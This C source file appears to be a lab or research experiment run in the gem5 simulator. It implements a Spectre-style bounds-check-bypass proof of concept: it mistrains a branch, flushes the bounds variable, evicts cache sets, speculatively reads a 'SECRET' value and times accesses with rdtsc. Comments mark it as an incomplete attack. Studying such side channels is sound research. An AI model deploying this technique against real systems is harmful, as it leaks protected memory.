#include<stdio.h>
#include<stdlib.h>
#include"/home/tarun-d/Desktop/gem5/include/gem5/m5ops.h"
#include<inttypes.h>
#include<x86intrin.h>

#pragma intrinsic(__rdtsc)

int x,y,z,z1,z2;
int array1[100];
char array2[100]; 
int array3[8192];

int a1_len = 100;

// TODO: full-fledged attack.

// TODO: a1_len must not be #define, rather we'll have to define that value in a variable so that it gets fetched every time. 
//*      This can be done by creating a conflict every time that value is being fetched from the set-associative cache.
//*      This will increase the transient execution time such that we can execute the speculated instructions for a longer amount of time.

/*
 * Considering:
 * Cache Size = 32kB
 * Associativity = 1 (Direct Mapped)
 * Line Size = 64B
 */

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void func(int N,int mul){                       
    if(N < a1_len){                             //* array2[64] => because array2 is a char array.
        temp = array2[mul * array1[N]];         //* => array1[105] = array3[1] = 1  at  0x6bc5e4  ;  array2[0] = 0x6bc3c0
                                                //* array1[105] has been placed in the cache beforehand to lessen the time for accessing that.
    }
}

void fill_cache(){

    for(int k=0;k<256;k=k+16){            
        x = array3[k];
    }
    
}

//TODO Task: Print the program counter.

int main(){
    int i,j;
    printf("\nAddress of a1_len = %p \n" , &a1_len);
    printf("\nAddress of i = %p \n" , &i);
    printf("\nAddress of j = %p \n" , &j);
    printf("\nAddress of x = %p \n" , &x);
    printf("\nAddress of y = %p \n" , &y);
    printf("\nAddress of z = %p \n" , &z);              // 0x6bc424
    printf("\nAddress of array1 = %p \n" , array1);
    printf("\nAddress of array2 = %p \n" , array2);
    printf("\nAddress of array3 = %p \n" , array3);

    int * a1len_ptr = &a1_len;
    int mul = 64;                   //* Not used.

    // m5_global_init();           //* Stats are from here.
    // m5_dump_reset_stats(0,0);

    _mm_lfence();
    _mm_mfence();

    m5_global_init();

    array3[1] = 1;      /* SECRET */           // TODO: array1[105] = 1; So we should get more access time for A2 in the end;

    //*-------------- Initializing array1 ----------------------

    // for(i=0;i<100;i++){
    //     printf("%d\n",array1[i]);          //* All the 100 accesses for array2[] will be of array2[64*0] == array2[0]
    // }
    

    for(j=0;j<100;j++){                 //* Training         
        func(j,0);
    }

    _mm_lfence();
    _mm_mfence();

    printf("\n\n---------------- Done Training -----------------------\n\n");

    _mm_clflush(a1len_ptr);

    fill_cache();               //* To remove a1_len from cache, to increase the time for transient execution.

    
    _mm_lfence();
    _mm_mfence();

    
    x = array3[8056];    //* 0x6c43c0    //* A1 => To remove array2[0] from cache. Gets mapped to same set as array2[0]
    x = array3[8072];    //* 0x6c4400    //* A2 => To remove array2[64] from cache. Gets mapped to same set as array2[64]

    x = array3[1];      //* array3[1] is accessed so that this counts as a hit in func()

    func(105,64);                          //* Trigger

    _mm_lfence();
    _mm_mfence();

    m5_global_init();

    _mm_lfence();
    _mm_mfence();

    //*-----------------------------------------  rdtsc instruction  ------------------------------------------------------------

    uint64_t t1, t2, t3;
    
    t1 = __rdtsc();
    
    x = array3[8056];

    // _mm_lfence();                //TODO: Is lfence/mfence really required?
    // _mm_mfence();

    t2 = __rdtsc();
    
    x = array3[8072];

    t3 = __rdtsc();

    printf("a3[8056] access time => t2-t1 = %" PRId64 "\na3[8072] access time => t3-t2 = %" PRId64 "\n",t2-t1,t3-t2);
    



    // m5_dump_reset_stats(0,0);
    
    

    
}